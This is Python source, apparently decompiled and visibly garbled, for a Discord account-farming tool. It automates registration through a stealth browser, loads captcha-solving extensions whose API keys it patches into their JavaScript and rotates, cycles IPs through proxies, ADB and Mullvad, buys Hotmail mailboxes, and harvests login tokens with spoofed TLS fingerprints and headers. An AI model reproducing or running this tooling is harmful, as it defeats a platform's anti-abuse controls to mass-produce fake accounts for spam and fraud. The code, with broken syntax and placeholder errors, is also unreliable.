NOPECHA_KEYS_FILE = Path(__file__).parent/'input'/'nopecha_keys.txt'.resolve()
CAPSOLVER_EXT_ID = 'dhdgiekdgeedgphbghjckgjdhgopidii'
CAPSOLVER_EXT_DIR = Path(__file__).parent/'capsolver_ext'.resolve()
CAPSOLVER_KEYS_FILE = Path(__file__).parent/'input'/'capsolver_keys.txt'.resolve()
CAPSOLVER_KEY_FILE = Path(__file__).parent/'input'/'capsolver_key.txt'.resolve()
ACTIVE_CAPTCHA_PROVIDER = 'nopecha'
ACTIVE_CAPTCHA_EXT_DIR: Optional[Path] = None
def get_brave_path() -> Optional[str]:
  paths = BROWSER_CONFIG['brave']['paths']
  for p in paths:
    if os.path.exists(p):
      p
      return
    else:
      continue

def get_edge_path() -> Optional[str]:
  paths = BROWSER_CONFIG['edge']['paths']
  for p in paths:
    if os.path.exists(p):
      p
      return
    else:
      continue

def get_playwright_path() -> Optional[str]:
  try:
    from playwright.sync_api import sync_playwright
    with sync_playwright() as p:
      exec_path = p.chromium.executable_path
      if exec_path and os.path.exists(exec_path):
        return exec_path
      else:
        None.__CHAOS_PY_NULL_PTR_VALUE_ERR__(None,None)

  except Exception:
    pass

  pw_dir = Path(os.path.expandvars('%LOCALAPPDATA%\\ms-playwright'))
  if pw_dir.exists():
    for p in pw_dir.rglob('chrome.exe'):
      if p.exists():
        str(p)
        return
      else:
        continue
        for p in pw_dir.rglob('headless_shell.exe'):
          if p.exists():
            str(p)
            return
          else:
            continue

def get_chrome_path() -> Optional[str]:
  paths = BROWSER_CONFIG.get('chrome',{}).get('paths',[])
  for p in paths:
    if os.path.exists(p):
      p
      return
    else:
      continue

  return get_playwright_path()

def get_browser_executable(browser_choice: str = None) -> Tuple[(Optional[str],str)]:
  choice = (browser_choice or config.get('browser','brave') or 'brave').strip().lower()
  if choice in ('brave',):
    p = get_brave_path()
    return (p,'Brave')
  else:
    if choice in ('edge','msedge'):
      p = get_edge_path()
      return (p,'Microsoft Edge')
    else:
      if choice in ('chrome','google-chrome','googlechrome','playwright','chromium'):
        p = get_chrome_path()
        if p:
          return (p,'Google Chrome')

  for name,getter in (('Brave',get_brave_path),('Google Chrome',get_chrome_path),('Microsoft Edge',get_edge_path)):
    p = getter()
    if p:
      (p,name)
      return
    else:
      continue

  return (None,'System Default Browser')

class BrowserContext:
  def __init__(self):
    self.driver = None

  async def start(self,url='https://discord.com/register',extension_path=None,proxy=None,nopecha_key=None):
    browser_type = config.get('browser','brave')
    executable_path,browser_name = get_browser_executable(browser_type)
    args = ['--no-sandbox','--disable-setuid-sandbox','--disable-dev-shm-usage','--lang=en-US','--disable-infobars','--disable-search-engine-choice-screen']
    if :
      pass

    active_ext = __CHAOS_PY_NULL_PTR_VALUE_ERR__ if CAPSOLVER_EXT_DIR/'manifest.json'.exists() else __CHAOS_PY_NULL_PTR_VALUE_ERR__ if ACTIVE_CAPTCHA_PROVIDER == 'capsolver' else CAPSOLVER_EXT_DIR
    target_ext = (extension_path or active_ext)
    if target_ext and Path(target_ext)/'manifest.json'.exists():
      ext_path = str(Path(target_ext).resolve())
      args.append(f'''--load-extension={ext_path}''')
      args.append(f'''--disable-extensions-except={ext_path}''')
      args.append('--enable-extensions')

    try:
      cfg = uc.Config(browser_executable_path=executable_path if executable_path else None,browser_args=args,proxy=proxy,sandbox=False)
      cfg.browser_connection_timeout = 0.5
      cfg.browser_connection_max_tries = 30
      self.driver = await uc.start(config=cfg)
      tab = await self.driver.get(url)
      await tab.wait_for_ready_state('complete',timeout=30000)
    except Exception as e:
      log.error(f'''browser start failed ({browser_name}): {str(e)}''')
      return None

    try:
      await tab.evaluate(JS_UTILS)
    except Exception:
      pass

    return tab

  async def stop(self):
    if self.driver:
      try:
        await self.driver.stop()
      except Exception:
        pass
      except:
        pass
      finally:
        self.driver = None

      return None

pass
pass
pass
pass
pass
async def launch_browser(proxy_config=None,slot: int = 1,total: int = 1,temp_profile: str = None,worker_cache_dir=None):
  browser_type = config.get('browser','brave')
  executable_path,browser_name = get_browser_executable(browser_type)
  args = ['--no-sandbox','--disable-setuid-sandbox','--disable-dev-shm-usage','--lang=en-US','--disable-infobars','--disable-search-engine-choice-screen']
  if :
    pass

  active_ext = __CHAOS_PY_NULL_PTR_VALUE_ERR__ if CAPSOLVER_EXT_DIR/'manifest.json'.exists() else __CHAOS_PY_NULL_PTR_VALUE_ERR__ if ACTIVE_CAPTCHA_PROVIDER == 'capsolver' else CAPSOLVER_EXT_DIR
  if active_ext and active_ext/'manifest.json'.exists():
    ext_path = str(active_ext.resolve())
    args.append(f'''--load-extension={ext_path}''')
    args.append(f'''--disable-extensions-except={ext_path}''')
    args.append('--enable-extensions')

  proxy_str = None
  if proxy_config:
    proxy_str = (proxy_config.get('full_url') or proxy_config.get('url'))

  cfg = uc.Config(browser_executable_path=executable_path if executable_path else None,browser_args=args,proxy=proxy_str,user_data_dir=temp_profile if temp_profile else None,sandbox=False)
  cfg.browser_connection_timeout = 0.5
  cfg.browser_connection_max_tries = 30
  browser = await uc.start(config=cfg)
  return browser

NOPECHA_KEY_INDEX = 0
NOPECHA_KEY_LOCK = threading.Lock()
def clear_nopecha_ext():
  if NOPECHA_EXT_DIR.exists():
    return None
  else:
    try:
      settings_path = NOPECHA_EXT_DIR/'settings.json'
      if settings_path.exists():
        with open(settings_path,'w',encoding='utf-8') as f:
          json.dump({'key':'','keys':[],'enabled':False},f,indent=2)

    except Exception as e:
      log.debug(f'''NopeCHA settings.json clear error: {e}''')

    try:
      manifest_path = NOPECHA_EXT_DIR/'manifest.json'
      if manifest_path.exists():
        manifest = json.load(open(manifest_path,'r',encoding='utf-8'))
        if 'nopecha' in manifest:
          manifest.pop('nopecha',None)
          with open(manifest_path,'w',encoding='utf-8') as f:
            json.dump(manifest,f,indent=2)

    except Exception as e:
      log.debug(f'''NopeCHA manifest.json clear error: {e}''')

    CLEAN_PATTERNS = [(re.compile('key:me\\(ge\\(\\),\\"[^\\"]*\\"\\)',re.IGNORECASE),'key:me(ge(),"")'),(re.compile('keys:me\\(he\\(ge\\(\\)\\),\\[[^\\]]*\\]\\)',re.IGNORECASE),'keys:me(he(ge()),[])'),(re.compile('key:\\"[^\\"]*\\",keys:\\[[^\\]]*\\]',re.IGNORECASE),'key:"",keys:[]'),(re.compile('key:\\"sub_[^\\"]*\\"',re.IGNORECASE),'key:""'),(re.compile('keys:\\[\\"sub_[^\\"]*\\"\\]',re.IGNORECASE),'keys:[]')]
    js_dirs = [NOPECHA_EXT_DIR,NOPECHA_EXT_DIR/'assets']
    for js_dir in js_dirs:
      if js_dir.exists():
        for js_file in js_dir.glob('*.js'):
          try:
            original = js_file.read_text(encoding='utf-8',errors='ignore')
            patched = original
            for pattern,replacement in CLEAN_PATTERNS:
              patched = pattern.sub(replacement,patched)

            if patched != original:
              js_file.write_text(patched,encoding='utf-8')
              log.debug(f'''NopeCHA: cleaned key from {js_file.name}''')

          except Exception as e:
            log.debug(f'''NopeCHA: error cleaning {js_file.name}: {e}''')

    return None

def load_nopecha_keys() -> list:
  if NOPECHA_KEYS_FILE.exists():
    NOPECHA_KEYS_FILE.parent.mkdir(parents=True,exist_ok=True)
    NOPECHA_KEYS_FILE.write_text('')
    clear_nopecha_ext()
    return []
  else:
    keys = []
    seen = set()
    for line in NOPECHA_KEYS_FILE.read_text(encoding='utf-8',errors='ignore').splitlines():
      line = line.strip()
      if line and line.startswith('#') and line not in seen:
        seen.add(line)
        keys.append(line)

    if keys:
      clear_nopecha_ext()

    return keys

def get_current_nopecha_key() -> Optional[str]:
  keys = load_nopecha_keys()
  if keys:
    return None
  else:
    return keys[NOPECHA_KEY_INDEX%len(keys)]

def rotate_nopecha_key():
  global NOPECHA_KEY_INDEX
  keys = load_nopecha_keys()
  if keys and len(keys) > 1:
    with NOPECHA_KEY_LOCK:
      NOPECHA_KEY_INDEX = NOPECHA_KEY_INDEX+1%len(keys)
      next_key = keys[NOPECHA_KEY_INDEX]

    log.info(f'''Rotated to NopeCHA key #{NOPECHA_KEY_INDEX+1}/{len(keys)} ({next_key[:10]}...)''')
    inject_nopecha_key(next_key,all_keys=keys,log_output=False)
    return None
  else:
    return None
    return None

def inject_nopecha_key(api_key: Optional[str] = None,all_keys: Optional[list] = None,log_output: bool = True) -> bool:
  keys_list = all_keys if all_keys is not None else load_nopecha_keys()
  if keys_list and api_key:
    keys_list = [api_key]

  primary_key = (api_key or keys_list)
  if primary_key or keys_list:
    clear_nopecha_ext()
    return False
  else:
    if NOPECHA_EXT_DIR.exists():
      return False
    else:
      ok = False
      try:
        settings_path = NOPECHA_EXT_DIR/'settings.json'
        settings = {}
        if settings_path.exists():
          try:
            settings = json.load(open(settings_path,'r',encoding='utf-8'))
          except Exception:
            settings = {}

      except Exception as e:
        log.debug(f'''NopeCHA settings.json write error: {e}''')

      settings['key'] = primary_key
      settings['keys'] = keys_list
      settings['enabled'] = True
      with open(settings_path,'w',encoding='utf-8') as f:
        json.dump(settings,f,indent=2)

      keys_list[0] if __CHAOS_PY_NULL_PTR_VALUE_ERR__ else ''
      ok = True
      key_json = json.dumps(primary_key)
      keys_json = json.dumps(keys_list)
      KEY_PATTERNS = [(re.compile('key:me\\(ge\\(\\),\\"[^\\"]*\\"\\)',re.IGNORECASE),lambda m: f'''key:me(ge(),{key_json})'''),(re.compile('keys:me\\(he\\(ge\\(\\)\\),\\[[^\\]]*\\]\\)',re.IGNORECASE),lambda m: f'''keys:me(he(ge()),{keys_json})'''),(re.compile('key:\\"[^\\"]*\\",keys:\\[[^\\]]*\\]',re.IGNORECASE),lambda m: f'''key:{key_json},keys:{keys_json}''')]
      js_dirs = [NOPECHA_EXT_DIR,NOPECHA_EXT_DIR/'assets']
      for js_dir in js_dirs:
        if js_dir.exists():
          for js_file in js_dir.glob('*.js'):
            try:
              original = js_file.read_text(encoding='utf-8',errors='ignore')
              patched = original
              for pattern,replacement in KEY_PATTERNS:
                patched = pattern.sub(replacement,patched)

              if patched != original:
                js_file.write_text(patched,encoding='utf-8')
                log.debug(f'''NopeCHA: patched {js_file.name}''')
                ok = True

            except Exception as e:
              log.debug(f'''NopeCHA: error patching {js_file.name}: {e}''')

      if ok and log_output:
        if len(keys_list) > 1:
          log.info(f'''NopeCHA: {len(keys_list)} keys loaded, active key #{NOPECHA_KEY_INDEX+1} ({primary_key[:10]}...)''')
        else:
          log.info(f'''NopeCHA: key injected ({primary_key[:10]}...)''')

      return ok

def download_nopecha_ext() -> Optional[Path]:
  if NOPECHA_EXT_DIR.exists() and NOPECHA_EXT_DIR/'manifest.json'.exists():
    return NOPECHA_EXT_DIR
  else:
    crx_url = f'''https://clients2.google.com/service/update2/crx?response=redirect&prodversion=120.0.0.0&acceptformat=crx2,crx3&x=id%3D{NOPECHA_EXT_ID}%26uc'''
    try:
      with httpx.Client(follow_redirects=True) as client:
        r = client.get(crx_url,headers={'User-Agent':'Mozilla/5.0'},timeout=60)
        if r.status_code != 200:
          try:
            return None
          except:
            pass

        else:
          data = r.content
          None.__CHAOS_PY_NULL_PTR_VALUE_ERR__(None,None)
          match __CHAOS_PY_NULL_PTR_VALUE_ERR__:
            case 'Cr24':
              version = int.from_bytes(data[4:8],'little')
              if version == 3:
                zip_start = 12+int.from_bytes(data[8:12],'little')
              else:
                zip_start = 16+int.from_bytes(data[8:12],'little')+int.from_bytes(data[12:16],'little')
                zip_start = 0

          NOPECHA_EXT_DIR.mkdir(exist_ok=True,parents=True)
          with zipfile.ZipFile(io.BytesIO(data[zip_start:])) as z:
            z.extractall(NOPECHA_EXT_DIR)

          if NOPECHA_EXT_DIR/'manifest.json'.exists():
            return NOPECHA_EXT_DIR
          else:
            return None

    except Exception:
      return None

async def setup_nopecha():
  ext_path = download_nopecha_ext()
  if ext_path:
    return None
  else:
    keys = load_nopecha_keys()
    if keys:
      current_key = get_current_nopecha_key()
      inject_nopecha_key(current_key,all_keys=keys,log_output=True)
    else:
      clear_nopecha_ext()

    return ext_path

def load_capsolver_key() -> str:
  key = (config.get('capsolver_api_key') or config.get('capsolver_key') or '')
  if key:
    captcha_sec = config.get('captcha',{})
    if isinstance(captcha_sec,dict):
      key = (captcha_sec.get('capsolver_key') or captcha_sec.get('api_key') or '')

  if key:
    capsolver_sec = config.get('capsolver',{})
    if isinstance(capsolver_sec,dict):
      key = (capsolver_sec.get('api_key') or capsolver_sec.get('key') or '')

  if key and str(key).strip():
    return str(key).strip()
  else:
    for k_file in (CAPSOLVER_KEY_FILE,CAPSOLVER_KEYS_FILE):
      if k_file.exists():
        for line in k_file.read_text(encoding='utf-8',errors='ignore').splitlines():
          line = line.strip()
          if line and line.startswith('#'):
            line
            return
          else:
            continue

    return ''

def save_capsolver_key(key: str):
  key = key.strip()
  if key:
    return None
  else:
    try:
      CAPSOLVER_KEY_FILE.parent.mkdir(parents=True,exist_ok=True)
      CAPSOLVER_KEY_FILE.write_text(f'''{key}\n''',encoding='utf-8')
    except Exception as e:
      log.debug(f'''CapSolver key write to file error: {e}''')

    try:
      cfg_path = Path(__file__).parent/'config.json'
      if cfg_path.exists():
        with open(cfg_path,'r',encoding='utf-8') as f:
          c_data = json.load(f)

        if 'captcha' not in c_data or isinstance(c_data['captcha'],dict):
          c_data['captcha'] = {}

        c_data['captcha']['provider'] = 'capsolver'
        c_data['captcha']['capsolver_key'] = key
        c_data['capsolver_api_key'] = key
        with open(cfg_path,'w',encoding='utf-8') as f:
          json.dump(c_data,f,indent=2)

    except Exception as e:
      log.debug(f'''CapSolver key write to config.json error: {e}''')
      return None

    config['capsolver_api_key'] = key
    if 'captcha' not in config or isinstance(config['captcha'],dict):
      config['captcha'] = {}

    config['captcha']['provider'] = 'capsolver'
    config['captcha']['capsolver_key'] = key
    return None

def check_capsolver_balance(api_key: str) -> Tuple[(bool,float,str)]:
  try:
    r = requests.post('https://api.capsolver.com/getBalance',json={'clientKey':api_key},timeout=8)
    if r.status_code == 200:
      data = r.json()
      if data.get('errorId',0) == 0:
        bal = float(data.get('balance',0))
        return (True,bal,'OK')
      else:
        msg = (data.get('errorDescription') or data.get('errorCode') or 'API error')
        return (False,0,msg)

    else:
      return (False,0,f'''HTTP {r.status_code}''')

  except Exception as e:
    return (False,0,str(e))

def download_capsolver_ext() -> Optional[Path]:
  if CAPSOLVER_EXT_DIR.exists():
    if CAPSOLVER_EXT_DIR/'manifest.json'.exists():
      return CAPSOLVER_EXT_DIR
    else:
      for sub in list(CAPSOLVER_EXT_DIR.iterdir()):
        if sub.is_dir() and sub/'manifest.json'.exists():
          for item in sub.iterdir():
            dest = CAPSOLVER_EXT_DIR/item.name
            if dest.exists():
              if dest.is_dir():
                shutil.rmtree(dest,ignore_errors=True)
              else:
                dest.unlink(missing_ok=True)

            shutil.move(str(item),str(CAPSOLVER_EXT_DIR))

          shutil.rmtree(sub,ignore_errors=True)
          if CAPSOLVER_EXT_DIR/'manifest.json'.exists():
            CAPSOLVER_EXT_DIR
            return

        else:
          continue
          shutil.rmtree(CAPSOLVER_EXT_DIR,ignore_errors=True)

  github_release_urls = ['https://github.com/capsolver/capsolver-browser-extension/releases/download/v1.17.1/CapSolver.Browser.Extension-chrome-v1.7.1.zip','https://github.com/capsolver/capsolver-browser-extension/releases/download/v.1.17.0/CapSolver.Browser.Extension-chrome-v1.17.0.zip','https://github.com/capsolver/capsolver-browser-extension/releases/download/v1.16.5/CapSolver.Browser.Extension-chrome-v1.16.5.zip','https://github.com/capsolver/capsolver-browser-extension/releases/download/v1.16.0/CapSolver.Browser.Extension-v1.16.0.zip']
  for gh_url in github_release_urls:
    try:
      with httpx.Client(follow_redirects=True) as client:
        r = client.get(gh_url,headers={'User-Agent':'Mozilla/5.0'},timeout=60)
        if r.status_code == 200 and len(r.content) > 50000:
          CAPSOLVER_EXT_DIR.mkdir(exist_ok=True,parents=True)
          with zipfile.ZipFile(io.BytesIO(r.content)) as z:
            z.extractall(CAPSOLVER_EXT_DIR)

          if CAPSOLVER_EXT_DIR/'manifest.json'.exists():
            None.CAPSOLVER_EXT_DIR(None,None)
            return
          else:
            for sub in list(CAPSOLVER_EXT_DIR.iterdir()):
              if sub.is_dir() and sub/'manifest.json'.exists():
                for item in sub.iterdir():
                  dest = CAPSOLVER_EXT_DIR/item.name
                  shutil.move(str(item),str(CAPSOLVER_EXT_DIR))

                shutil.rmtree(sub,ignore_errors=True)
                CAPSOLVER_EXT_DIR
                None.__CHAOS_PY_NULL_PTR_VALUE_ERR__(None,None)
                return
              else:
                continue

    except Exception as e:
      log.debug(f'''CapSolver release download failed ({gh_url}): {e}''')
      continue

  crx_url = f'''https://clients2.google.com/service/update2/crx?response=redirect&prodversion=120.0.0.0&acceptformat=crx2,crx3&x=id%3D{CAPSOLVER_EXT_ID}%26uc'''
  try:
    with httpx.Client(follow_redirects=True) as client:
      r = client.get(crx_url,headers={'User-Agent':'Mozilla/5.0'},timeout=60)
      if r.status_code == 200 and len(r.content) > 50000:
        data = r.content
        if data[:4] == 'Cr24':
          version = int.from_bytes(data[4:8],'little')
          if version == 3:
            zip_start = 12+int.from_bytes(data[8:12],'little')
          else:
            zip_start = 16+int.from_bytes(data[8:12],'little')+int.from_bytes(data[12:16],'little')

        else:
          zip_start = 0

        CAPSOLVER_EXT_DIR.mkdir(exist_ok=True,parents=True)
        with zipfile.ZipFile(io.BytesIO(data[zip_start:])) as z:
          z.extractall(CAPSOLVER_EXT_DIR)

  except Exception as e:
    log.debug(f'''CapSolver CRX download failed: {e}''')

  if CAPSOLVER_EXT_DIR/'manifest.json'.exists():
    None.CAPSOLVER_EXT_DIR(None,None)
    return
  else:
    None.__CHAOS_PY_NULL_PTR_VALUE_ERR__(None,None)
    if CAPSOLVER_EXT_DIR/'manifest.json'.exists():
      pass

    return None

def inject_capsolver_key(api_key: str,log_output: bool = True) -> bool:
  if api_key or (CAPSOLVER_EXT_DIR.exists() and CAPSOLVER_EXT_DIR/'manifest.json'.exists()):
    return False
  else:
    cfg_data = {'enabledForFunCaptcha':True,'enabledForCloudflare':True,'enabledForAwsCaptcha':True,'enabledForImageToText':True,'enabledForHCaptcha':True,'enabledForRecaptchaV3':True,'enabledForRecaptcha':True,'blackUrlList':[],'enabledForBlacklistControl':False,'useProxy':False,'onDetectedCallback':'onDetectedCallback','solvedFailedCallback':'captchaSolvedFailedCallback','solvedCallback':'captchaSolvedCallback','manualSolving':False,'useCapsolver':True,'appId':'','apiKey':api_key,'reCaptchaMode':'click','hCaptchaMode':'click','reCaptchaDelayTime':0,'hCaptchaDelayTime':0,'textCaptchaDelayTime':0,'awsDelayTime':0,'reCaptchaRepeatTimes':10,'reCaptcha3RepeatTimes':10,'hCaptchaRepeatTimes':10,'funCaptchaRepeatTimes':10,'textCaptchaRepeatTimes':10,'awsRepeatTimes':10,'reCaptcha3TaskType':'ReCaptchaV3TaskProxyLess','showSolveButton':True}
    ok = False
    assets_dir = CAPSOLVER_EXT_DIR/'assets'
    assets_dir.mkdir(parents=True,exist_ok=True)
    try:
      with open(assets_dir/'config.js','w',encoding='utf-8') as f:
        f.write(f'''export const defaultConfig = {json.dumps(cfg_data,indent=2)};\n''')

    except Exception as e:
      log.debug(f'''CapSolver config.js write error: {e}''')

    ok = True
    try:
      with open(assets_dir/'config.json','w',encoding='utf-8') as f:
        json.dump(cfg_data,f,indent=2)

    except Exception as e:
      log.debug(f'''CapSolver config.json write error: {e}''')

    ok = True
    for search_dir in (CAPSOLVER_EXT_DIR,assets_dir):
      for js_file in search_dir.glob('*.js'):
        try:
          content = js_file.read_text(encoding='utf-8',errors='ignore')
          if 'apiKey:' in content or '"apiKey":' in content:
            patched = re.sub('apiKey:\\s*["\\\'][^"\\\']*["\\\']',f'''apiKey: "{api_key}"''',content)
            patched = re.sub('"apiKey":\\s*["\\\'][^"\\\']*["\\\']',f'''"apiKey": "{api_key}"''',patched)
            if patched != content:
              js_file.write_text(patched,encoding='utf-8')
              ok = True

        except Exception:
          pass

    if ok and log_output:
      masked_key = f'''{api_key[:8]}...''' if len(api_key) > 8 else api_key
      log.info(f'''CapSolver: AI auto-solver configured ({masked_key})''')

    return ok

async def setup_capsolver(api_key: Optional[str] = None) -> Optional[Path]:
  key = (api_key or load_capsolver_key())
  if key:
    log.warning('CapSolver: No API key configured')
    return None
  else:
    valid,bal,msg = check_capsolver_balance(key)
    if valid:
      log.info(f'''CapSolver: connected successfully (balance: ${bal:.2f})''')
    else:
      log.warning(f'''CapSolver connection note: {msg}''')

    ext_path = download_capsolver_ext()
    if ext_path and ext_path/'manifest.json'.exists():
      inject_capsolver_key(key)
      return ext_path
    else:
      log.error('CapSolver: could not download or find extension in capsolver_ext')
      return None

try:
  import psutil
  PSUTIL_AVAILABLE = True
except ImportError:
  PSUTIL_AVAILABLE = False

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore',category=ResourceWarning)
warnings.filterwarnings('ignore',message='.*connection.*refused.*')
warnings.filterwarnings('ignore',message='.*Task exception was never retrieved.*')
import logging
logging.getLogger('asyncio').setLevel(logging.CRITICAL)
logging.getLogger('websockets').setLevel(logging.CRITICAL)
logging.getLogger('nodriver').setLevel(logging.CRITICAL)
async def fetch_discord_token(email: str,password: str,proxy_config: Dict = None) -> str:
  url = 'https://discord.com/api/v9/auth/login'
  _super_props = base64.b64encode(json.dumps({'os':'Windows','browser':'Chrome','device':'','system_locale':'en-US','browser_user_agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36','browser_version':'131.0.0.0','os_version':'10','referrer':'','referring_domain':'','referrer_current':'','referring_domain_current':'','release_channel':'stable','client_build_number':346580,'client_event_source':None},separators=(',',':')).encode()).decode()
  headers = {'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/json','origin':'https://discord.com','referer':'https://discord.com/login','sec-ch-ua':'"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36','x-discord-locale':'en-US','x-discord-timezone':'America/New_York','x-super-properties':_super_props}
  payload = {'login':email,'password':password,'undelete':False,'gift_code_sku_id':None}
  session = tls_client.Session(client_identifier='chrome_131',random_tls_extension_order=True)
  if proxy_config:
    proxy_dict = get_session_proxy(proxy_config)
    if proxy_dict:
      session.proxies = proxy_dict

  try:
    response = session.post(url,headers=headers,json=payload)
    if response.status_code == 200:
      data = response.json()
      token = data.get('token','')
      if token:
        return token
      else:
        if data.get('mfa'):
          log.debug('API login: MFA required')
        else:
          if data.get('captcha_key'):
            sitekey = data.get('captcha_sitekey','')
            log.warning(f'''Discord login HTTP 200 — captcha required (sitekey={sitekey})''')

        return ''

    else:
      if response.status_code == 400:
        body = response.json()
        captcha_key = body.get('captcha_key')
        if captcha_key:
          sitekey = body.get('captcha_sitekey','')
          log.warning(f'''Discord login HTTP 400 — captcha required (sitekey={sitekey})''')
        else:
          log.debug(f'''API login 400: {body}''')

        return ''
      else:
        log.debug(f'''API login HTTP {response.status_code}''')
        return ''

  except Exception as e:
    log.debug(f'''API login exception: {e}''')
    return ''

JS_UTILS = '''
(() => {
    if (window.utils) return; // Already injected
    
    function setInput(selector, value) {
        const el = document.querySelector(selector);
        if (el) {
            el.value = value;
            el.dispatchEvent(new Event(\'input\', { bubbles: true }));
            el.dispatchEvent(new Event(\'change\', { bubbles: true }));
        }
    }
    
    function clickAllCheckboxes() {
        const checkboxes = document.querySelectorAll(\'input[type="checkbox"]\');
        let clicked = 0;
        checkboxes.forEach(cb => {
            if (!cb.checked) {
                cb.click();
                cb.checked = true;
                cb.dispatchEvent(new Event(\'change\', { bubbles: true }));
                clicked++;
            }
        });
        return { clicked: clicked, total: checkboxes.length };
    }
    
    function clickElement(selector) {
        const el = document.querySelector(selector);
        if (el) el.click();
    }
    
    function setDropdown(label, value) {
        const dropdown = document.querySelector(`div[role="button"][aria-label="${label}"]`);
        if (!dropdown) return;
        
        dropdown.click();
        
        setTimeout(() => {
            const options = document.querySelectorAll(\'div[role="option"]\');
            const match = Array.from(options).find(opt => opt.textContent.trim() === value);
            if (match) match.click();
        }, 100);
    }
    
    function waitForDiscordToken(timeout = 5000) {
        return new Promise((resolve) => {
            const start = Date.now();
            const check = () => {
                const token = localStorage.getItem(\'token\');
                if (token) {
                    resolve(token.replace(/^"|"$/g, \'\'));
                } else if (Date.now() - start < timeout) {
                    setTimeout(check, 200);
                } else {
                    resolve(null);
                }
            };
            check();
        });
    }
    
    function findCaptchaFrame() {
        const iframes = document.querySelectorAll(\'iframe\');
        for (let iframe of iframes) {
            const src = iframe.src || \'\';
            if (src.includes(\'captcha\') || src.includes(\'hcaptcha\') || src.includes(\'recaptcha\')) {
                return iframe;
            }
        }
        return null;
    }
    
    window.utils = {
        setInput,
        clickAllCheckboxes,
        clickElement,
        setDropdown,
        waitForDiscordToken,
        findCaptchaFrame
    };
})();
'''
console = Console()
LOCK = threading.Lock()
SCRIPT_DIR = Path(__file__).parent
MS_CLIENT_ID = 'd8fbe69d-15be-43fa-b204-5c5bc5a73ad7'
BROWSER_CACHE_DIR = Path(__file__).parent/'.browser_cache'
BROWSER_CACHE_DIR.mkdir(exist_ok=True)
SESSION_TARGET = 0
SESSION_CREATED = 0
SESSION_STOP = False
ACTIVE_WORKERS = 0
WORKER_LOCK = threading.Lock()
COOLDOWN_SECONDS = 90
PROXY_LIST: list = []
SESSION_VALID = 0
SESSION_LOCKED = 0
SESSION_INVALID = 0
SESSION_UNVERIFIED = 0
CONFIG_PATH = Path('config.json')
OUTPUT_DIR = Path('output')
OUTPUT_DIR.mkdir(exist_ok=True)
BROWSER_CACHE_DIR = Path(__file__).parent/'.browser_cache'
BROWSER_CACHE_DIR.mkdir(exist_ok=True)
def load_or_create_config():
  if CONFIG_PATH.exists():
    config_text = '''{
    "email_provider": {
        "name": "draxono",
        "client_key": ""
    },
    "zues_key": "YOUR_ZEUS_API_KEY",
    "mail_type": "trusted",
    "use_wasted_mails": false,
    "browser": "brave",
    "proxy": {
        "enabled": false,
        "file": "input/proxies.txt"
    },
    "adb": {
        "enabled": false,
        "device_id": "",
        "settle_seconds": 6,
        "verify_ip": true,
        "max_wait": 45
    },
    "mullvad": {
        "enabled": false,
        "countries": [],
        "settle_seconds": 2,
        "verify_ip": true,
        "max_wait": 25
    },
    "threads": 1,
    "cooldown": 90
}
'''
    with open(CONFIG_PATH,'w',encoding='utf-8') as f:
      f.write(config_text)

    print(f'''\n\x1b[93m[CONFIG]\x1b[0m Config created: {CONFIG_PATH}''')
    print('\x1b[93m[CONFIG]\x1b[0m Edit it with your settings then run again.\n')
    sys.exit(0)

  with open(CONFIG_PATH,'r',encoding='utf-8') as f:
    config = json.load(f)

  provider = config.get('email_provider',{}).get('name','')
  if provider in ('mailcow','cowmail'):
    provider = 'cowmail'
    config['email_provider']['name'] = 'cowmail'
    config['email_provider']['cowmail'] = config['email_provider']['mailcow']
    if 'cowmail' in config['email_provider'] and 'mailcow' not in config['email_provider']:
      config['email_provider'][__CHAOS_PY_NULL_PTR_VALUE_ERR__ if 'cowmail' not in config['email_provider'] else __CHAOS_PY_NULL_PTR_VALUE_ERR__ if 'mailcow' in config['email_provider'] else 'mailcow'] = config['email_provider']['cowmail']

  if provider not in ('draxono','hotmail007','cowmail','duckmail','crowmail'):
    print(f'''\x1b[91m[ERROR]\x1b[0m Invalid email provider in config: {provider}''')
    print('[93mINFO •[0m Please set \'email_provider.name\' to \'draxono\', \'hotmail007\', \'cowmail\', \'duckmail\', or \'crowmail\'')
    sys.exit(1)

  return config

config = load_or_create_config()
THREAD_COUNT = config.get('threads',1)
COOLDOWN_SECONDS = config.get('cooldown',90)
ADB_CONFIG = config.get('adb',{})
ADB_ENABLED = ADB_CONFIG.get('enabled',False)
MULLVAD_CONFIG = config.get('mullvad',{})
MULLVAD_ENABLED = MULLVAD_CONFIG.get('enabled',False)
if sys.platform == 'win32':
  import ctypes
  try:
    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleMode(kernel32.GetStdHandle(-11),7)
  except Exception:
    pass

GRAY = Style.MUTED
GREEN = Style.HI
CYAN = Style.WHITE
RED = Style.HI
YELLOW = Style.SILVER
WHITE = Style.WHITE
RESET = Style.RESET
BLUE = Style.SILVER
PURPLE = Style.HI
PINK = Style.WHITE
DIM = Style.DARK
BOLD = Style.BOLD
Logger = LeakXLogger
log = LeakXLogger()
_adb_device_id = (ADB_CONFIG.get('device_id','').strip() or None)
try:
  adb_rotator = ADBRotator(logger=log,device_id=_adb_device_id)
except TypeError:
  adb_rotator = ADBRotator(logger=log)

mullvad_rotator = MullvadRotator(logger=log,config=MULLVAD_CONFIG)
class Hotmail007API:
  def __init__(self,client_key: str):
    self.session = requests.Session()
    self.session.verify = False
    self.client_key = client_key
    self.base_url = 'https://api.hotmail007.com'
    self.mail_types = ['outlook','hotmail']

  def _fetch_email(self,mail_type: str) -> dict:
    url = f'''{self.base_url}/api/mail/getMail'''
    params = {'clientKey':self.client_key,'mailType':mail_type,'quantity':1}
    try:
      resp = self.session.get(url,params=params,verify=False,timeout=30)
      if resp.status_code == 200:
        data = resp.json()
        if data.get('success') and data.get('code') == 0 and 'data' in data:
          accounts = data['data']
          if accounts:
            parts = accounts[0].split(':')
            if len(parts) >= 4:
              return {'success':True,'email':parts[0],'password':parts[1],'token':parts[2],'uuid':parts[3] if parts[3] else ''}

      else:
        return {'success':False}

    except Exception as e:
